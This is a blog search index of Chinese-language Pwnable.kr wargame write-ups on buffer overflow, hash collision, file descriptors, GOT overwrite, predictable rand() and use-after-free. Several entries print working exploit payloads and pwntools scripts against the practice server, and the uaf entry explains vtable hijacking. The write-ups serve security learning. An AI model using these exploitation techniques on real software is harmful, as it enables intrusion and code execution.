<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>bof</title>
    <url>/xiaohong404.github.io/2020/10/15/bof/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/4.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/1.png" class></strong></p>
<h3 id="查看给出的c语言源代码"><a href="#查看给出的c语言源代码" class="headerlink" title="查看给出的c语言源代码"></a>查看给出的c语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/2.png" class></strong></p>
<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
<h3 id="IDA32打开文件"><a href="#IDA32打开文件" class="headerlink" title="IDA32打开文件"></a>IDA32打开文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/3.png" class></strong></p>
<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>collision</title>
    <url>/xiaohong404.github.io/2020/10/15/collision/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/collision/1.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/15/collision/2.png" class></strong></p>
<h3 id="查看C语言源代码"><a href="#查看C语言源代码" class="headerlink" title="查看C语言源代码"></a>查看C语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/collision/3.png" class></strong></p>
<h3 id="main-int-argc-char-argv"><a href="#main-int-argc-char-argv" class="headerlink" title="main(int argc, char* argv[])"></a><a href="https://blog.csdn.net/LYJ_viviani/article/details/51873961">main(int argc, char* argv[])</a></h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/collision/4.png" class></strong></p>
<p>传递三个参数$aa,bb,cc$, 程序运行结果如下:</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/collision/5.png" class></strong></p>
<p><strong>注意：若传递n个参数，实际上相当于给main函数传递了n+1个参数，argc=n+1（因为argv[0]是路径名自动传递）</strong></p>
<h3 id="分析col-c"><a href="#分析col-c" class="headerlink" title="分析col.c"></a>分析col.c</h3><ul>
<li>函数传递了两个参数，第一个参数为int型，第二个参数为一个字符数组，main函数首先判断第一个参数如果小于2,即若不显式传递参数，则打印argv[0]之后会直接退出。</li>
<li>argv[1]，即传入的第二个参数，第一个参数为文件所在路径，指向的字符串的长度需要等于20字节。</li>
<li>check_password函数将指向20字节的字符指针转为int指针，因为int是4字节，即将20字节字符串拆分成为5个int类型的数据，之后求和。</li>
<li>如果求和的结果和给定的哈希值0x21DD09EC相等，则会执行system函数拿到flag。</li>
</ul>
<p>最直接的想法是暴力穷举，寻找哈希碰撞，但实际上这里可以直接凑出这个哈希值，可以令20字节的前16字节都设置为0x01，<strong>注意不能设置为0x00</strong>，因为0x00是一个截断字符，程序读入argv[1]时如果遇到了0x00会自动截断，从而导致程序结果有误。</p>
<p>另外，注意数据按照小端序存放：</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/collision/6.png" class></strong></p>
<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/collision/7.png" class></strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">./col $(python -c <span class="string">&quot;print &#x27;\x01\x01\x01\x01&#x27;*4 + &#x27;\xe8\x05\xd9\x1d&#x27;&quot;</span>)</span><br><span class="line"><span class="comment"># 这一inline的python表达式可以将生成的结果作为argv[1]参数</span></span><br></pre></td></tr></table></figure>

<h3 id="拿到flag"><a href="#拿到flag" class="headerlink" title="拿到flag"></a>拿到flag</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/collision/8.png" class></strong></p>
]]></content>
      <tags>
        <tag>Pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>fd</title>
    <url>/xiaohong404.github.io/2020/10/15/fd/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/fd/1.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/15/fd/2.png" class></strong></p>
<h3 id="登录远程服务器"><a href="#登录远程服务器" class="headerlink" title="登录远程服务器"></a>登录远程服务器</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/fd/3.png" class></strong></p>
<h3 id="ls-la查看文件信息"><a href="#ls-la查看文件信息" class="headerlink" title="ls -la查看文件信息"></a>ls -la查看文件信息</h3><p><strong><a href="https://blog.csdn.net/u013197629/article/details/73608613">linux文件权限知识</a></strong></p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/fd/4.png" class></strong></p>
<p>发现fd.c和其对应的可执行文件fd（用户有执行权限）</p>
<h3 id="cat-fd-c查看c语言代码"><a href="#cat-fd-c查看c语言代码" class="headerlink" title="cat fd.c查看c语言代码"></a>cat fd.c查看c语言代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/fd/5.png" class></strong></p>
<p>有源代码可知，这里需要执行system函数的条件为buf缓冲区内容为LETMEIWN</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/fd/6.png" class></strong></p>
<h3 id="read-fd-buf-32"><a href="#read-fd-buf-32" class="headerlink" title="read(fd,buf,32)"></a>read(fd,buf,32)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">read(fd, buf, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">fd == <span class="number">0</span>时：则表示标准输入；</span><br><span class="line">fd == <span class="number">1</span>时：则表示 标准输出；</span><br><span class="line">fd == <span class="number">2</span>时，则表示标准输出错误。</span><br><span class="line">buf 表示读入的缓冲区；</span><br><span class="line"><span class="number">32</span>表示读入<span class="number">32</span>字节；</span><br></pre></td></tr></table></figure>

<p>因此我们需要设置fd为0，读取我们输入的LETMEWIN到buf缓冲区中即可获得flag。</p>
<p>注意到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fd = atoi(argv[<span class="number">1</span>]) - <span class="number">0x1234</span></span><br></pre></td></tr></table></figure>

<p>要使得$fd=0$，就是让main函数的第一个参数argv[1]等于$0x1234$</p>
<h3 id="fd-4660"><a href="#fd-4660" class="headerlink" title="./fd 4660"></a>./fd 4660</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/fd/7.png" class></strong></p>
<p>注意这里参数需要转为10进制   $0x1234_{16} = 4660_{10}$</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>passcode</title>
    <url>/xiaohong404.github.io/2020/10/15/passcode/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/passcode/11.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/15/passcode/1.png" class></strong></p>
<h3 id="查看passcode-c源文件"><a href="#查看passcode-c源文件" class="headerlink" title="查看passcode.c源文件"></a>查看passcode.c源文件</h3><p><strong></strong></p>
<p>第一反应为使得passcode1为338150、passcode2为13371337，之后调用system函数。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/passcode/3.png" class></strong></p>
<p>login函数中要求输入两个密码passcode1和passcode2，但scanf函数用法错误，其后并没有加上&amp;符号取其地址，而是直接使用了栈上两个没有初始化的随机值，因此直接输入则会出现segmentation fault。因此考虑在login函数之前执行的welcome函数。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/passcode/4.png" class></strong></p>
<p>welcome函数要求用户输入姓名的字符串，但是允许输入100字节长度，因此尝试使用其覆盖栈上两个变量的“随机值”。</p>
<h3 id="gdb-passcode查看其汇编代码"><a href="#gdb-passcode查看其汇编代码" class="headerlink" title="gdb passcode查看其汇编代码"></a>gdb passcode查看其汇编代码</h3><h4 id="disassemble-r-welcome"><a href="#disassemble-r-welcome" class="headerlink" title="disassemble /r welcome"></a>disassemble /r welcome</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/passcode/5.png" class></strong></p>
<h4 id="disassemble-r-login"><a href="#disassemble-r-login" class="headerlink" title="disassemble /r login"></a>disassemble /r login</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/passcode/6.png" class></strong></p>
<p>发现char数组在$ebp - 0x70$处，而passcode1、passcode2分别在$ebp - 0x10、ebp - 0xc$处，其相差的距离$0x70 - 0x10 = 96 &lt; 100,0x70 - 0xc = 100$，因此并不能直接通过输入姓名字符串覆盖变量passcode2,只可以覆盖passcode1。</p>
<h3 id="转换思路"><a href="#转换思路" class="headerlink" title="转换思路"></a>转换思路</h3><h4 id="查看文件保护措施"><a href="#查看文件保护措施" class="headerlink" title="查看文件保护措施"></a>查看文件保护措施</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/passcode/7.png" class></strong></p>
<p>栈上开启了Canary机制，因此栈溢出很难成功，发现没有开启PIE，因此可以通过修改某些函数got表的地址，进行调用system函数。实际上，既然scanf是一个具有写功能的函数，我们完全可以利用scanf来修改此后使用到的某个函数的got表项。例如，程序在<strong>scanf(“%d”, passcode1);**后立即使用了</strong>fflush函数<strong>，所以我们完全可以先找到fflush的got表项地址（程序没有开PIE，无需leak），把passcode1布局为该地址，并在调用到scanf(“%d”, passcode1)时输入程序代码中调用</strong>system(“/bin/cat flag”);**处的地址，这样执行fflush函数时就会执行system函数。</p>
<p><strong>注意这里区分got表本身的地址和写入got表项中的地址</strong></p>
<h4 id="fflush函数的地址"><a href="#fflush函数的地址" class="headerlink" title="fflush函数的地址"></a>fflush函数的地址</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/passcode/8.png" class></strong></p>
<p>fflush地址为$0x0804a004$</p>
<h4 id="system函数的地址"><a href="#system函数的地址" class="headerlink" title="system函数的地址"></a>system函数的地址</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/passcode/9.png" class></strong></p>
<p>这里注意system函数需要将参数先压栈之后再调用，即真正调用的函数地址为$0x080485e3$，即在printf函数之后执行。</p>
<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;A&#x27; * 96 + &#x27;\x04\xa0\x04\x08&#x27; + &#x27;134514147\n&#x27;&quot;</span> | ./passcode</span><br></pre></td></tr></table></figure>

<p>因为passcode是输入int型，即输入$0x080485e3 = 134514147$。</p>
<h3 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/passcode/10.png" class></strong></p>
]]></content>
      <tags>
        <tag>Pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>random</title>
    <url>/xiaohong404.github.io/2020/10/15/random/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/random/1.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/15/random/2.png" class></strong></p>
<h3 id="查看random-c源代码"><a href="#查看random-c源代码" class="headerlink" title="查看random.c源代码"></a>查看random.c源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/random/3.png" class></strong></p>
<p>函数的整个执行流程是rand（）产生的随机值和输入的密钥进行异或，若其结果等于$0xdeadbeef$，则可以执行system函数，拿到flag。</p>
<h3 id="rand（）函数"><a href="#rand（）函数" class="headerlink" title="rand（）函数"></a>rand（）函数</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/random/4.png" class></strong></p>
<p>由此可见，如果不重新生成种子（一般情况下，默认生成种子为1），则每次产生的随机数将会是一个固定值，那么接下来的任务就是确定这个固定值。</p>
<h3 id="查看随机数"><a href="#查看随机数" class="headerlink" title="查看随机数"></a>查看随机数</h3><h4 id="disassemble-r-main-查看汇编代码"><a href="#disassemble-r-main-查看汇编代码" class="headerlink" title="$disassemble /r \ main$查看汇编代码"></a>$disassemble /r \ main$查看汇编代码</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/random/5.png" class></strong></p>
<h4 id="在cmp处下断点"><a href="#在cmp处下断点" class="headerlink" title="在cmp处下断点"></a>在cmp处下断点</h4><p>汇编代码中，在进行cmp之前先进行了一次异或运算，显然这是将用户输入的key和生成的随机数进行异或，由此可以判断随机数的位置为$rbp-4$（先压入栈中），因此使用$x/10x \ $rbp-4$查看内存的值即可。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/random/6.png" class></strong></p>
<p>所以生成的随机数为0x6b8b4567，可多次运行程序查看其值是否发生变化，这里不做演示。</p>
<h3 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h3><p>求出$0x6b8b4567\oplus 0xdeadbeef$的值输入即可</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/random/7.png" class></strong></p>
]]></content>
      <tags>
        <tag>Pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>flag</title>
    <url>/xiaohong404.github.io/2020/10/15/flag/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/1.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/2.png" class></strong></p>
<h3 id="checksec查看文件属性"><a href="#checksec查看文件属性" class="headerlink" title="checksec查看文件属性"></a>checksec查看文件属性</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/3.png" class></strong></p>
<h3 id="windows下使用upx-d命令解压缩"><a href="#windows下使用upx-d命令解压缩" class="headerlink" title="windows下使用upx -d命令解压缩"></a>windows下使用upx -d命令解压缩</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/4.png" class></strong></p>
<h3 id="IDA64打开解压缩的文件"><a href="#IDA64打开解压缩的文件" class="headerlink" title="IDA64打开解压缩的文件"></a>IDA64打开解压缩的文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/5.png" class></strong></p>
<p>将flag的值存放到dest中，直接查看flag即可</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/6.png" class></strong></p>
]]></content>
      <tags>
        <tag>Pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>uaf</title>
    <url>/xiaohong404.github.io/2020/10/16/uaf/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/16/uaf/1.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/16/uaf/2.png" class></strong></p>
<h3 id="查看uaf-cpp文件源代码"><a href="#查看uaf-cpp文件源代码" class="headerlink" title="查看uaf.cpp文件源代码"></a>查看uaf.cpp文件源代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">        <span class="keyword">int</span> age;</span><br><span class="line">        <span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;My name is &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a nice guy!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a cute girl!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        Human* m = <span class="keyword">new</span> Man(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">        Human* w = <span class="keyword">new</span> Woman(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">size_t</span> len;</span><br><span class="line">        <span class="keyword">char</span>* data;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1. use\n2. after\n3. free\n&quot;</span>;</span><br><span class="line">                <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                                m-&gt;introduce();</span><br><span class="line">                                w-&gt;introduce();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                                len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">                                data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">                                read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                                <span class="keyword">delete</span> m;</span><br><span class="line">                                <span class="keyword">delete</span> w;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序定义一个名为human的虚基类，之后定义了Man和Woman两个类继承这个类，并各自重写了父类的introduce()方法，主函数中，分别创建了一个Man和Woman的对象, 用户可以输入三个选项，分别为：</p>
<ol>
<li><p>use：Man和Woman分别调用introduce()方法，即使用指针指向的函数</p>
</li>
<li><p>after：分配一段地址空间存储main函数传递的数据，我们可以用其将已经被free的内存，重新allocate</p>
</li>
<li><p>free：delete释放掉创建的对象的空间，即将指针指向的内存释放</p>
<p>三者的组合即可构成UAF漏洞</p>
</li>
</ol>
<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="前置知识1：虚函数的内存地址空间"><a href="#前置知识1：虚函数的内存地址空间" class="headerlink" title="前置知识1：虚函数的内存地址空间"></a>前置知识1：虚函数的内存地址空间</h3><p>在C++中，如果类中有虚函数，那么它就会有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据。对于子类，最开始的内存数据记录着父类对象的拷贝（包括父类虚函数表指针和成员变量）。 之后是子类自己的成员变量数据。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/16/uaf/3.png" class></strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::f&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::g&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::h&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">    <span class="keyword">int</span> base; </span><br><span class="line">    <span class="keyword">protected</span>: </span><br><span class="line">    <span class="keyword">private</span>: </span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">//子类1，无虚函数重载 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child1</span> :</span> <span class="keyword">public</span> Base </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Child1::f1&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Child1::g1&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Child1::h1&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">    <span class="keyword">int</span> child1; </span><br><span class="line">    <span class="keyword">protected</span>: </span><br><span class="line">    <span class="keyword">private</span>: </span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">//子类2，有1个虚函数重载 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child2</span> :</span> <span class="keyword">public</span> Base </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Child2::f&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g2</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Child2::g2&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h2</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Child2::h2&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">    <span class="keyword">int</span> child2; </span><br><span class="line">    <span class="keyword">protected</span>: </span><br><span class="line">    <span class="keyword">private</span>: </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="单一继承，无虚函数重载"><a href="#单一继承，无虚函数重载" class="headerlink" title="单一继承，无虚函数重载"></a>单一继承，无虚函数重载</h4><p><strong><img src="/xiaohong404.github.io/2020/10/16/uaf/4.png" class></strong></p>
<h4 id="单一继承，重载了虚函数"><a href="#单一继承，重载了虚函数" class="headerlink" title="单一继承，重载了虚函数"></a>单一继承，重载了虚函数</h4><p><strong><img src="/xiaohong404.github.io/2020/10/16/uaf/5.png" class></strong></p>
<h4 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h4><p><strong><img src="/xiaohong404.github.io/2020/10/16/uaf/6.png" class></strong></p>
<p><strong><img src="/xiaohong404.github.io/2020/10/16/uaf/7.png" class></strong></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li>如果一个类中有虚函数，那么就会建立一张虚函数表vtable，子类继承父类vtable，若，父类的vtable中私有(private)虚函数,则子类vtable中同样有该私有(private)虚函数的地址。<strong>注意这并不是直接继承了私有(private)虚函数</strong></li>
<li>当子类重载父类虚函数时，修改vtable同名函数地址，改为指向子类的函数地址，若子类中有新的虚函数，在vtable尾部添加。</li>
<li>vptr每个对象都会有一个，而vptable是每个类有一个，vptr指向vtable，一个类中就算有多个虚函数，也只有一个vptr；做多重继承的时候，继承了多个父类，就会有多个vptr</li>
</ul>
<h3 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use-After-Free"></a>Use-After-Free</h3><p><a href="https://zh.wikipedia.org/wiki/%E8%BF%B7%E9%80%94%E6%8C%87%E9%92%88">Dangling pointer</a></p>
<p>Dangling pointer即指向被释放的内存的指针，通常是由于释放内存后，未将指针置为NULL。</p>
<h4 id="UAF原理"><a href="#UAF原理" class="headerlink" title="UAF原理"></a>UAF原理</h4><p>对Dangling pointer所指向内存进行use，如指针解引用等。</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>将Dangling pointer所指向的内存重新分配回来，且尽可能使该内存中的内容可控（如重新分配为字符串）</p>
<h4 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> (*func)() <span class="comment">//函数指针，可以理解为类里面的方法</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>假设有上述这样的一个结构体指针p，在释放掉p之后，没有将p置NULL，所以p变成Dangling pointer，再通过重新分配，再次拿到p之前指向的这段地址空间。之后，通过strcpy(p2,”addr”)，或者其他方式，向这段地址空间写入新数据。然后当我们通过其他函数，再次使用p指针，就会造成无法预料的后果，因为<strong>此时p指针指向的内存包含的内容已经改变</strong>。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/16/uaf/8.png" class></strong></p>
<h4 id="数据控制"><a href="#数据控制" class="headerlink" title="数据控制"></a><strong>数据控制</strong></h4><ul>
<li>任意地址读：$puts(p-&gt;name)—————&gt;puts(char*(addr2))$</li>
<li>任意地址写：$strcpy(p-&gt;name,data);——&gt;strcpy((char *)(addr2),data)$</li>
<li>控制流劫持：$p-&gt;func()———————&gt;call\  addr3$</li>
</ul>
